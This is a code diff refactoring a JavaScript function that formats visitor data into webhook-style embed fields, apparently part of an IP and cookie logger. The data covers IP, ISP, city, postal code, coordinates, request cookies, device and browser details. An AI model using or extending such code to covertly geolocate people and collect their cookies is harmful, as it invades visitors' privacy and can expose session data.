@@ -119,40 +119,43 @@ function logDebugInfo(reverseDNS, requestMetadata) {
 }
 
 
-function createCommonFields(ipDetails, coords, userAgent, deviceType, os, browserEngine, acceptLanguage, acceptEncoding, doNotTrack, referer, reverseDNS, requestMetadata) {
-    const safeValue = (value, fallback = "Unknown") => `\`${value || fallback}\``;
-
+function createCommonFields(
+    ipDetails, coords, userAgent, deviceType, os, browserEngine,
+    acceptLanguage, acceptEncoding, doNotTrack, referer,
+    reverseDNS, requestMetadata
+) {
     return [
-        { name: "IP", value: safeValue(ipDetails.query, "Not available"), inline: true },
-        { name: "Provider", value: safeValue(ipDetails.isp), inline: true },
-        { name: "Organization", value: safeValue(ipDetails.org), inline: true },
-        { name: "ASN", value: safeValue(ipDetails.as), inline: true },
-        { name: "Continent", value: safeValue(ipDetails.continent), inline: true },
-        { name: "Country", value: safeValue(ipDetails.country), inline: true },
-        { name: "Region", value: safeValue(ipDetails.regionName), inline: true },
-        { name: "City", value: safeValue(ipDetails.city), inline: true },
-        { name: "District", value: safeValue(ipDetails.district), inline: true },
-        { name: "Postal Code", value: safeValue(ipDetails.zip), inline: true },
-        { name: "Coords", value: coords || "Not available", inline: true },
-        { name: "Timezone", value: safeValue(ipDetails.timezone), inline: true },
-        { name: "Reverse DNS", value: safeValue(reverseDNS, "N/A"), inline: false },
-        { name: "Cookies", value: safeValue(requestMetadata.cookies, "N/A"), inline: false },
-        { name: "Connection", value: safeValue(requestMetadata.connection, "N/A"), inline: true },
-        { name: "Content-Type Options", value: safeValue(requestMetadata.contentTypeOptions, "N/A"), inline: true },
-        { name: "Frame Options", value: safeValue(requestMetadata.frameOptions, "N/A"), inline: true },
-        { name: "Device Info", value: safeValue(userAgent), inline: false },
-        { name: "Device Type", value: safeValue(deviceType), inline: true },
-        { name: "Operating System", value: safeValue(os), inline: true },
-        { name: "Browser Rendering Engine", value: safeValue(browserEngine), inline: true },
-        { name: "Browser Language", value: safeValue(acceptLanguage), inline: true },
-        { name: "Accept-Encoding", value: safeValue(acceptEncoding), inline: true },
-        { name: "Do Not Track", value: safeValue(doNotTrack), inline: true },
-        { name: "Referer", value: safeValue(referer, "No referer"), inline: false },
-        { name: "Network Type", value: safeValue(ipDetails.mobile ? "Mobile" : "Broadband"), inline: true },
-        { name: "Using Proxy/VPN", value: safeValue(ipDetails.proxy ? "Yes" : "No"), inline: true },
-        { name: "Hosting", value: "`No`", inline: true }
+        { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
+        { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
+        { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
+        { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
+        { name: "Continent", value: `\`${ipDetails.continent || "Unknown"}\``, inline: true },
+        { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
+        { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
+        { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
+        { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
+        { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
+        { name: "Coords", value: coords, inline: true },
+        { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
+        { name: "Reverse DNS", value: `\`${reverseDNS || "N/A"}\``, inline: false },
+        { name: "Cookies", value: `\`${requestMetadata.cookies || "N/A"}\``, inline: false },
+        { name: "Connection", value: `\`${requestMetadata.connection || "N/A"}\``, inline: true },
+        { name: "Content-Type Options", value: `\`${requestMetadata.contentTypeOptions || "N/A"}\``, inline: true },
+        { name: "Frame Options", value: `\`${requestMetadata.frameOptions || "N/A"}\``, inline: true },
+        { name: "Device Info", value: `\`${userAgent}\``, inline: false },
+        { name: "Device Type", value: `\`${deviceType}\``, inline: true },
+        { name: "Operating System", value: `\`${os}\``, inline: true },
+        { name: "Browser Rendering Engine", value: `\`${browserEngine}\``, inline: true },
+        { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
+        { name: "Accept-Encoding", value: `\`${acceptEncoding}\``, inline: true },
+        { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
+        { name: "Referer", value: `\`${referer}\``, inline: false },
+        { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
+        { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
+        { name: "Hosting", value: "\`No\`", inline: true }
     ];
 }
+
 
 
 
